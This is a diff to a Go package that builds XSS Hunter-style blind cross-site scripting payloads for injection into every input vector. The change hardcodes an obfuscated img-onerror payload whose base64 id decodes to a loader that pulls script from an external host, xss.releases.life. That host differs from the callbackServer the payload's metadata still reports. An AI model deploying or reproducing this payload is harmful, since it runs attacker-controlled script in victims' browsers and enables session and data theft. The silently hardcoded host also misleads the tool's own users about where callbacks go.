@@ -2,9 +2,7 @@ package xss
 
 import (
 	"crypto/rand"
-	"encoding/base64"
 	"encoding/hex"
-	"fmt"
 )
 
 // XSSPayload representa un payload XSS con su metadata
@@ -34,23 +32,17 @@ func GeneratePayloadID() string {
 func GetAllPayloads(callbackServer string) []XSSPayload {
 	payloads := []XSSPayload{}
 
-	// Generar componentes comunes para los payloads de XSS Hunter
-	// 1. Loader JS estándar
-	jsLoader := fmt.Sprintf(`var a=document.createElement("script");a.src="%s";document.body.appendChild(a);`, callbackServer)
-	// 2. Loader en Base64 (para eval(atob(...)))
-	b64Loader := base64.StdEncoding.EncodeToString([]byte(jsLoader))
+	// === PAYLOAD ESPECÍFICO XSS HUNTER ===
+	// Usamos el payload exacto proporcionado, con el loader en Base64 ya definido
+	specificPayload := `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlbGVhc2VzLmxpZmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>`
 
-	// === PAYLOADS PRINCIPALES (IMG ONLY) ===
-	// Solo usamos el de IMG ya que está verificado que funciona
-
-	// Payload 1: Img OnError (Base64) - El clásico de XSS Hunter
 	id1 := GeneratePayloadID()
 	payloads = append(payloads, XSSPayload{
 		ID:          id1,
-		Type:        "img-onerror-b64",
+		Type:        "img-onerror-specific",
 		Vector:      "all", // Se inyectará en TODOS los vectores
 		CallbackURL: callbackServer,
-		Content:     fmt.Sprintf(`"><img src=x id=%s onerror=eval(atob(this.id))>`, b64Loader),
+		Content:     specificPayload,
 	})
 
 	return payloads
